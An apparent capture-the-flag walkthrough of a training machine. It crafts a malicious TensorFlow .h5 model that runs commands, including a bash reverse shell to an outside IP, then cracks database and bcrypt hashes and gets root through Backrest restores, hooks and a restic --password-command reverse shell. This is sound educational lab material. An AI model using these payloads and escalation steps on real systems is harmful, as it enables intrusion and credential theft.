Artificial starts with an AI website where I can upload models that are run with TensorFlow. I’ll exploit a deserialization vulnerability in how TensorFlow handles h5 files to get RCE and a foothold. I’ll find hashes in the database and crack one to pivot to the next user. That user has access to an instance of Backrest running on localhost. I’ll find the config and crack the hash to get access, and then show three ways to get execution as root through the application.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

Based on the [OpenSSH and nginx](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 20.04 focal (or perhaps 20.10 groovy). That’s a no longer supported OS, so I’ll want to keep an eye out for opportunities that may arise from that.

The webserver redirects to `artificial.htb`. I’ll use `ffuf` to bruteforce for subdomains that respond differently from the main redirect, but not find any. I’ll add this to my `/etc/hosts` file:

```
10.10.11.74 artificial.htb
```

### Website - TCP 80

#### Site

The site is an AI “empowerment” site:

 ![image-20250618131142029](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618131142029.webp)![expand](/icons/expand.png)

The main page doesn’t really say how it works, but it does show an example model generated using [TensorFlow](https://www.tensorflow.org/) and some Python code.

There’s a registration form, and on registering and logging in, there’s a page to upload AI models:

![image-20250618132230129](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618132230129.webp)

The `requirements.txt` file is a single line:

```bash
tensorflow-cpu==2.13.1
```

The `Dockerfile` allows me to create an environment that will work with theirs:

```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

If I try to upload a file, the default filter is looking for `.h5` files. These are [hierarchical data format](https://en.wikipedia.org/wiki/Hierarchical_Data_Format) files, and are commonly used with TensorFlow to export and import machine learning models. If I try to upload a different file, it just reloads the dashboard with no message or sign of anything different.

I’ll create an empty file (`touch test.h5`) and upload that, and it does show up on the dashboard:

![image-20250618132708544](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618132708544.webp)

Clicking “View Predictions” just reloads the dashboard.

#### Tech Stack

The HTTP response headers just show nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 25 Jun 2025 17:09:06 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 5442
```

The 404 page matches the [default Flask 404](about:/cheatsheets/404#flask):

![image-20250618132757445](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618132757445.webp)

It makes sense that this site would be in Python given the use of AI models and models exported from Python.

I’ll also note the TensorFlow version from the `requirements.txt` and `Dockerfile`, 2.13.1. This is almost certainly the version running on the server.

#### Directory Brute Force

I’ll run `feroxbuster` against the site to look for any unlinked paths:

```
oxdf@hacky$ feroxbuster -u http://artificial.htb

Nothing interesting there.

## Shell as app

### Identify Vulnerability

#### tensorflow-cpu Fail

I’ll spend a bunch of time looking for vulnerabilities in the `tensorflow-cpu` package version 2.13.1. [This page](https://security.snyk.io/package/pip/tensorflow-cpu) from snyk shows the vulnerabilities at this time:

![image-20250618134934678](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618134934678.webp)

Nothing past 2.12.

#### TensorFlow + h5

When TensorFlow saves a model to a file, it’s serializing the Python objects into a binary file that can be loaded again restoring those objects. This is a classically dangerous activity. Python Pickle module has been historically used for this, and it is well known that uploading a Pickle file to another site can lead to RCE.

In searching for this, there are lots of articles:

![image-20250618135827617](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618135827617.webp)

### Strategy

The second link in the search above is for a page titled [TensorFlow Remote Code Execution with Malicious Model](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model). The [security page](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) on the TensorFlow Github talks about how models are basically code, and not to run untrusted models.

In the exploit post, it shows this code:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("touch /tmp/pwned")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

This is very similar looking to the code from the website:

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

The example legit code is a bit more because it’s trying to do something. But both have the same structure:

- A model based on `tensorflow.keras.Sequential` object is given layers.
- The model’s `compile` function is called.
- The model’s `save` function is called, outputting a `.h5` file.

The exploit post notes that in a real attack scenario the exploit payload would be mixed in with a lot of legit layers making it harder to spot.

### Generate Payload

#### Configure Docker

Deserialization attacks often depend on having the Python and package versions exactly the same as the target, so having a `dockerfile` for the target removes a lot of the guesswork. I’ll build the Docker container from the `dockerfile`:

```
oxdf@hacky$ docker build . -t artificial

```

The entrypoint of the container is `bash`, so running with `-it` will just drop into the container with an interactive terminal:

```
oxdf@hacky$ docker run -it -v $(pwd):/share artificial:latest 
root@276fc8f96daa:/code#
```

I’m also sharing the current directory into the container as `/share` so I have an easy way to get files out of the container when I need to.

#### Generate Payload

I’ll save a copy of the exploit code to the current directory that is mounted into the container. Now it’s visible in the `/share` directory in the container:

```
root@276fc8f96daa:/share# cat exploit.py 
import tensorflow as tf

def exploit(x):
    import os
    os.system("ping -c 2 10.10.14.6")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

I’ve changed the `os.system` call to ping my host, as the original POC just wrote a file to `/tmp`, which I have no means to see.

From within the container, I’ll run this with Python:

```
root@276fc8f96daa:/share# python exploit.py 
2025-06-25 18:49:25.956956: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
sh: 1: ping: not found
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via \`model.save()\`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. \`model.save('my_model.keras')\`.
  saving_api.save_model(
```

It actually complains about `ping` not being found, which means that it tries to run `ping` during this build process. Despite the error, it still generates the output file `exploit.h5`.

### Execute

#### POC

I’ll delete my previous models and upload this one to the site. On upload, nothing happens, but it does show up on the dashboard:

![image-20250618145234325](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618145234325.webp)

On clicking “View Predictions”, there’s ICMP at my listening `tcpdump`:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

18:50:22.326895 IP 10.10.11.74 > 10.10.14.6: ICMP echo request, id 2, seq 2, length 64
18:50:22.326916 IP 10.10.14.6 > 10.10.11.74: ICMP echo reply, id 2, seq 2, length 64
```

Interestingly, my payload said to ping twice, but there are four incoming ICMP packets, suggesting that the payload is executed twice.

#### Shell

To get a shell, I’ll update the payload to [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```python
def exploit(x):
    import os
    #os.system("ping -c 2 10.10.14.6")
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'")
    return x
```

When I run the script to build the payload, it tries to run the rev shell and fails to connect:

```
root@276fc8f96daa:/share# python exploit.py 
2025-06-25 18:54:21.666139: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
bash: connect: Connection refused
bash: line 1: /dev/tcp/10.10.14.6/443: Connection refused

  saving_api.save_model(
```

That’s ok. I’ll upload the file to Artificial, and start a `nc` listener. On clicking “View Predictions”, it hangs, and there’s a shell at my listener:

```
oxdf@hacky$ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.74 59218
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$
```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
app@artificial:~$ script /dev/null -c bash
Script started, file is /dev/null
app@artificial:~$ ^Z

                 ‍reset

app@artificial:~$
```

## Shell as gael

### Enumeration

#### Users

There are two users with home directories on the box:

```
app@artificial:/home$ ls
app  gael
```

This matches the users with shells set in `passwd`:

```
app@artificial:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

app can’t access `gael`.

#### Web Application

The web application seems to be running out of the app user’s home directory in the `app` folder:

```
app@artificial:~/app$ ls                                   
app.py  instance  models  __pycache__  static  templates
```

The `instance` directory has the SQLite database:

```
app@artificial:~/app$ ls instance/             
users.db
```

It only has two tables:

```
app@artificial:~/app$ sqlite3 instance/users.db    
SQLite version 3.31.1 2020-01-27 19:55:54          
Enter ".help" for usage hints.
sqlite> .tables
model  user
```

The `user` table is more interesting, containing usernames, emails, and password hashes:

```
sqlite> .headers on
sqlite> select * from user;
id|username|email|password
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|0xdf|0xdf@artificial.htb|9a17ef38bd5098be451a8ccaa93c0f19
```

These look like MD5 hashes based on the length of 32 hex characters. I’ll drop them into [CrackStation](https://crackstation.net/) and two are immediately found:

![image-20250618150204612](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618150204612.webp)

The top one is for the gael user, which is also the name of a user account on Artificial.

### Shell

The password works for gael using `su`:

```
app@artificial:~/app$ su - gael
Password: 
gael@artificial:~$
```

It also works over SSH which provides both a save point and a more solid shell:

```
oxdf@hacky$ sshpass -p 'mattp005numbertwo' ssh gael@artificial.htb
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
gael@artificial:~$
```

Either way I can grab `user.txt`:

```
gael@artificial:~$ cat user.txt
87f23df3************************
```

## Shell as root

### Enumeration

#### gael

Other than `user.txt`, there’s nothing really of interest in gael’s home directory:

```
gael@artificial:~$ ls -la
total 32
drwxr-x--- 4 gael gael 4096 Jun  9 08:53 .
drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
-rw-r--r-- 1 gael gael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gael gael 3771 Feb 25  2020 .bashrc
drwx------ 2 gael gael 4096 Sep  7  2024 .cache
-rw-r--r-- 1 gael gael  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
-rw-r----- 1 root gael   33 Jun  9 08:53 user.txt
```

They don’t have `sudo` privs either:

```
gael@artificial:~$ sudo -l
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.
```

#### Processes

Each user can only see their own processes:

```
gael@artificial:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
gael        2101  0.0  0.2  19076  9508 ?        Ss   19:01   0:00 /lib/systemd/systemd --user
gael        2262  0.0  0.1   8276  5356 pts/1    Ss   19:05   0:00 -bash
gael        2456  0.0  0.0   8888  3200 pts/1    R+   19:26   0:00 ps auxww
```

That’s because `/proc` is mounted as `hidepid=2`:

```
gael@artificial:~$ mount | grep ^proc
proc on /proc type proc (rw,relatime,hidepid=2)
```

Nothing interesting here.

#### Network

There are two services listening only on localhost that are worth investigating:

```
gael@artificial:~$ ss -tnlp
State        Recv-Q       Send-Q               Local Address:Port               Peer Address:Port       Process       
LISTEN       0            2048                     127.0.0.1:5000                    0.0.0.0:*                        
LISTEN       0            4096                     127.0.0.1:9898                    0.0.0.0:*                        
LISTEN       0            511                        0.0.0.0:80                      0.0.0.0:*                        
LISTEN       0            4096                 127.0.0.53%lo:53                      0.0.0.0:*                        
LISTEN       0            128                        0.0.0.0:22                      0.0.0.0:*                        
LISTEN       0            511                           [::]:80                         [::]:*                        
LISTEN       0            128                           [::]:22                         [::]:*
```

Port 5000 is just the local instance of the Flask application main site. The nginx config shows that port 80 is proxies there:

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    if ($host != artificial.htb) {
        rewrite ^ http://artificial.htb/;
    }

    server_name artificial.htb;

        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;

        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5000;
        }

}
```

9898 is something else. If I `grep` for “:9898” in `/etc` it’ll show the `backrest.service` file, which is a good lead on what the application is:

```
gael@artificial:/etc$ grep -r ':9898' 2>/dev/null
systemd/system/backrest.service:Environment="BACKREST_PORT=127.0.0.1:9898"
```

#### Backrest

Trying to hit port 9898 with `nc` shows it’s an HTTP server:

```
gael@artificial:~$ echo "asdfawsdfsdf" | nc localhost 9898
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

`curl` returns junk:

```
gael@artificial:~$ curl localhost:9898
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

I’ll setup an SSH tunnel from my host on 9898 to Artificial on 9898 (either by reconnecting with `-L 9898:localhost:9898` or by dropping into an SSH control shell). That opens 9898 on my host, and accessing it will tunnel requests through the SSH session and then out from Artificial. So opening `localhost:9898` in the browser now loads:

![image-20250618153505202](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618153505202.webp)

[Backrest](https://github.com/garethgeorge/backrest) is a web GUI that handles backups. It’s installed in `/opt/backrest`:

```
gael@artificial:/opt/backrest$ ls -l
total 51104
-rwxr-xr-x 1 app  ssl-cert 25690264 Feb 16 19:38 backrest

drwxr-xr-x 3 root root         4096 Jun 25 19:30 tasklogs
```

Only root can access the `jwt-secret`.

#### Backups

In `/var/backups`, there’s an archive referencing “backrest”:

```
gael@artificial:/var/backups$ ls -l
total 51220
-rw-r--r-- 1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r-- 1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r-- 1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r-- 1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r-- 1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r-- 1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
```

It’s readable by members of sysadm, which gael is in:

```
gael@artificial:/var/backups$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

`tar tf` will list what’s in the file:

```
gael@artificial:/var/backups$ tar tf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

I’ll extract the contents into `/tmp`:

```
gael@artificial:/var/backups$ tar xf backrest_backup.tar.gz -C /tmp/
gael@artificial:/var/backups$ cd /tmp/backrest/
gael@artificial:/tmp/backrest$ ls -a
.   backrest  install.sh  oplog.sqlite       oplog.sqlite-shm  processlogs  tasklogs
..  .config   jwt-secret  oplog.sqlite.lock  oplog.sqlite-wal  restic
```

The JWT secret file is there:

```
gael@artificial:/tmp/backrest$ cat jwt-secret | xxd
00000000: be06 f59c 292e cc79 2544 01ed 7287 7c9c  ....)..y%D..r.|.
00000010: 774c 1f46 280f 9e19 fad1 17dc c2a6 c723  wL.F(..........#
00000020: c701 233c 1376 d107 7fa9 ab57 0060 6416  ..#<.v.....W.\`d.
00000030: 7b40 63e6 936c d8bd 5089 4dc7 d34d e918  {@c..l..P.M..M..
```

In theory, I could figure out what a JWT for Backrest looks like, and try to forge a cookie. That seems hard for an easy box. I’ll keep looking.

In `.config/backrest` there’s a `config.json` file:

```
gael@artificial:/tmp/backrest/.config/backrest$ cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

It’s got the backrest\_root user’s password hash.

### Crack Password

The hash doesn’t look like a standard bcrypt hash, but rather base64 data. I’ll try decoding it, and it works:

```
oxdf@hacky$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
oxdf@hacky$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d > backrest.hash
```

I’ve saved it to a file for cracking.

I’ll pass that to `hashcat`, and it can’t determine the mode:

```
$ hashcat backrest.hash rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...                                                           
The following 4 hash-modes match the structure of your input hash:
                                                           
      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
                                                           
Please specify the hash-mode with -m [hash-mode].
...[snip]...
```

This is common with bcrypt. Unless I have reason to think otherwise, I’ll always start with 3200:

```
$ hashcat backrest.hash rockyou.txt -m 3200
hashcat (v6.2.6) starting 
...[snip]...
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
...[snip]...
```

It cracks very quickly.

### Backrest Overview

On logging into Backrest as backrest\_root with the password above, there’s nothing really here:

![image-20250618160017807](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618160017807.webp)

Backrest is a GUI wrapper around [restic](https://restic.net/), a command line backup utility. There are two objects in Backrest, Plans and Repositories. A repository is a storage location where backup data is kept, and the encryption keys that go with it. A plan is a configuration that defines what data is to be backed up, how often, and retention information.

### Escalation Paths

There are multiple ways to get execution from Backrest. I’ll show three:

- Reading SSH key via backup.
- Abusing Backrest hooks.
- Injecting into a `restic` command.

### Escalation via SSH Keys

I’ll create a repository filling out the first three required fields and leaving the rest default:

![image-20250618162909897](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618162909897.webp)

It now shows up on the left:

![image-20250618162942925](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618162942925.webp)

I’ll “Add Plan” and give it my repository and target `/root`, leaving the rest default:

![image-20250618164229841](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618164229841.webp)

On submitting, it shows up as well:

![image-20250618164244670](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618164244670.webp)

Clicking on RootExfil, there’s a “Backup Now” button:

![image-20250618164537029](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618164537029.webp)

There’s a backup scheduled for a bit from now, but hitting “Backup Now” and refreshing shows another:

![image-20250618164818049](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618164818049.webp)

The data is in `/dev/shm/0xdf`, but only root can access it:

```
gael@artificial:/dev/shm/0xdf$ ls -l
total 4
-r--------   1 root root  155 Jun 25 00:03 config
drwx------ 258 root root 5160 Jun 25 00:03 data
drwx------   2 root root   60 Jun 25 00:03 index

drwx------   2 root root   40 Jun 25 00:03 locks
drwx------   2 root root   60 Jun 25 00:03 snapshots
```

Clicking on the Backup in the web UI, there’s a Snapshot Browser that shows the files

![image-20250618164938366](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618164938366.webp)

Hovering over a folder or file offers a download icon and menu:

![image-20250618165010333](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618165010333.webp)

Selecting “Restore to path” offers a dialog asking for a path:

![image-20250618165033723](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618165033723.webp)

I’ll accept the offered path by clicking Restore. That directory is now in the filesystem root, but only accessible by root:

```
gael@artificial:/$ ls -ld root-backrest-restore-81b971a8/
drwx------ 3 root root 4096 Jun 25 00:06 root-backrest-restore-81b971a8/
```

The Restore now shows up in the Plan list:

![image-20250618165140931](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618165140931.webp)

Clicking on it offers a download files option:

![image-20250618165158373](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250618165158373.webp)

This downloads a `.tar.gz` file to my local filesystem! All the root files are in there:

```

I’ll extract it and grab the flag:

```
oxdf@hacky$ tar xf archive-2025-06-25-00-07-52.tar.gz 
oxdf@hacky$ cat root/root.txt
9ebd0c4e************************
```

I can also SSH with the `id_rsa` included in the file:

```
oxdf@hacky$ ssh -i root/.ssh/id_rsa root@artificial.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
root@artificial:~#
```

### Escalation via Hook

Another way to get execution out of Backrest is through the Plan itself. I’ll create another plan, this time not worrying about the path:

![image-20251018171751360](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018171751360.webp)

At the bottom, there’s an option to add a Hook:

![image-20251018171807767](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018171807767.webp)

Hovering gives options:

![image-20251018171828174](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018171828174.webp)

I’ll click “Command” and give it a command and select a bunch of conditions:

![image-20251018172032642](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018172032642.webp)

I’ll save this plan, and then on the plan page, hit “Backup Now”:

![image-20251018172112483](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018172112483.webp)

It actually errors because the path isn’t good, but in `/tmp`:

```
gael@artificial:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1183448 Oct 18 21:21 /tmp/0xdf
```

I’ll run with `-p` to not drop privs, and get a root shell:

```
gael@artificial:~$ /tmp/0xdf -p
0xdf-5.0#
```

### Escalation via Run Command

On the plan page, there’s a “Run Command” button:

![image-20251018172407367](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018172407367.webp)

If I click that, there’s a box that takes input that says to run “help” to get help:

![image-20251018172603470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018172603470.webp)

I’ll do that, and it shows that it is running `restic [input] -o sftp.args=-oBatchMode=yes`:

![image-20251018172632990](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251018172632990.webp)

In the help, there’s a `--password-command command` option:

```
--password-command command         shell command to obtain the repository password from (default: $RESTIC_PASSWORD_COMMAND)
```

I can give it any command there. I’ll enter that option with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```bash
check --password-command 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

I need to give it a valid `restic` command (`check` in this case), but then it runs and connects to my listening `nc` with a reverse shell as root:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.74 35512
bash: cannot set terminal process group (3494): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/#
```
